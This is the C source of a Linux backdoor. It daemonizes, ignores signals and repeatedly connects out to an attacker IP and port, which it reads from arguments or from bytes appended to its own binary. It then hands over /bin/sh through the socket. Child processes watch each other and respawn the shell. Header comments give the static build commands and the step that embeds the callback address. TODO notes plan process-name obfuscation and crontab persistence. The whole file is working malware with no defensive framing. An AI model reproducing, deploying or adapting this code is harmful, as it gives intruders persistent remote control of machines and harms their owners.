// yum install glibc-static
// gcc backdoor.c -static-libgcc -static -fPIC -s -Os -o backdoor
// python -c "open('backdoor', 'ab').write(b'\x0010.0.0.4:4444')"

// TODO: 防止重复运行
// TODO: 混淆进程名称
// TODO: 写crontab

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>

#define LEN 64

const char sh[] = "/bin/sh";
const char* shell = NULL;

__pid_t child_pid;
uint16_t conn_port=4444;
char conn_ip[LEN];

const char* check_shell();
void block_signal(int signal);
int read_config(const char* filename);
void usage(const char*);
__sighandler_t _daemon();
int reverse_shell();
__pid_t fork_backdoor();
int detect_child(__pid_t);
__sighandler_t parent_process();
__sighandler_t child_process();


int main(int argc, const char **argv, const char **envp) {
    int i, en;
    shell = check_shell();
    if (NULL == shell) {
        puts("ERROR: cannot find available shell.");
        return -1;
    }

    if (1 == argc) {
        puts("INFO: read config from itself.");
        int en = read_config(argv[0]);
        if (-1 == en) {
            puts("ERROR: cannot read self.");
        } else if (0 == en) {
            puts("ERROR: parse self config error.");
        }
        if (en <= 0) {
            usage(argv[0]);
            return -1;
        }
        // return -2;
    } else if (3 == argc) {
        strncpy(conn_ip, argv[1], LEN);
        conn_port = (uint16_t)strtol(argv[2], NULL, 10);
    } else {
        usage(argv[0]);
        return -1;
    }

    if (0 == conn_port) {
        puts("ERROR: port is 0.");
        usage(argv[0]);
        return -1;
    }
    // printf("INFO: use shell {%s} to reverse.\n", shell);
    printf("INFO: connect to %s:%hu\n", conn_ip, conn_port);
    
    //---- debug ----
    // return -2;
    //---- debug ----

    if (fork()) {
        exit(0);
    }
    setsid();
    if (fork()) {
        exit(0);
    }
    for (i = 0; i < 32; i++) {
        signal(i, SIG_IGN);
    }
    // signal(SIGSTOP, SIG_IGN);
    _daemon();
    return 0;
}

const char* check_shell() {
    int ret = 0;
    ret = access(sh, X_OK);
    if (0 == ret) {
        shell = sh;
    } else {
        shell = NULL;
    }
    return shell;
}

void block_signal(int signal) {
    printf("INFO: block signal %d.\n", signal);
    // return (__sighandler_t)0;
}

/**
 * return 1 success
 * return 0 not get ip and port
 * return -1 read file error
 */
int read_config(const char* filename) {
    FILE* f = fopen(filename, "rb");
    char buf[LEN];
    char c;
    int i = 0, start = -1, colon = -1;
    memset(buf, 0, LEN);
    if (NULL != f) {
        fseek(f, -LEN, SEEK_END);
        fread(buf, 1, LEN, f);
        fclose(f);
        // for (i = 0; i < 6; i++) {
        //     printf("%hhX\t", buf[i]);
        // }
        // puts("");
        // printf("%hhu.%hhu.%hhu.%hhu\n", buf[0], buf[1], buf[2], buf[3]);
        // printf("%hhX\t%hhX", buf[4], buf[5]);
        // printf("%hu\n", ((uint16_t)buf[4] << 8) | (uint16_t)buf[5]);
        for (i = 1; i < LEN; i++) {
            c = buf[i];
            if ((0 == buf[i - 1]) && c >= '0' && c <= '9') {
                start = i;
                // printf("DEBUG: start = %d\n", start);
                break;
            }
        }
        if (start > 0) {
            for (i = start + 7; i < LEN; i++) {
                c = buf[i];
                if (c == ':') {
                    colon = i;
                    // printf("DEBUG: colon = %d\n", colon);
                    break;
                }
            }
        }
        if (colon > 0) {
            memset(conn_ip, 0, LEN);
            memcpy(conn_ip, buf + start, colon - start);
            // printf("DEBUG: conn_ip = %s\n", conn_ip);
            conn_port = (uint16_t)strtol(buf + colon + 1, NULL, 10);
            // printf("DEBUG: conn_port = %d\n", conn_port);
            return 1;
        }
        
        // sprintf(conn_ip, "%hhu.%hhu.%hhu.%hhu", buf[0], buf[1], buf[2], buf[3]);
        // conn_port = ((uint16_t)buf[4] << 8) | (uint16_t)buf[5];
        return 0;
    }
    return -1;
}

void usage(const char* bin) {
    puts("Usage:");
    printf("%s ", bin);
    puts("<reverse ip> <port>");
}

int reverse_shell() {
    int sock;
    int ret = 0;
    struct sockaddr_in server;
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) != -1) {
        server.sin_family = AF_INET;
        server.sin_port = htons(conn_port);
        server.sin_addr.s_addr = inet_addr(conn_ip);
        if (connect(sock, (struct sockaddr *) &server, sizeof(struct sockaddr)) != -1) {
            dup2(sock, 0);
            dup2(sock, 1);
            dup2(sock, 2);
            ret = system(shell);
            close(sock);
        }
    }
    return ret;
}

__pid_t fork_backdoor() {
    __pid_t pid;
    pid = fork();
    if (!pid) {
        while (1) {
            reverse_shell();
            sleep(1);
        }
    }
    return pid;
}

int detect_child(__pid_t pid) {
    return kill(pid, 0) == 0;
}

__sighandler_t parent_process() {
    while ((unsigned int) detect_child(child_pid));
    return _daemon();
}

__sighandler_t _daemon() {
    child_pid = fork();
    if (child_pid) {
        return parent_process();
    }
    child_process();
    return signal(SIGSTOP, SIG_IGN);
}

__sighandler_t child_process() {
    __pid_t pid;

    pid = fork_backdoor();
    while (getppid() != 1) {
        if (!(unsigned int) detect_child(pid))
            pid = fork_backdoor();
    }
    return _daemon();
}
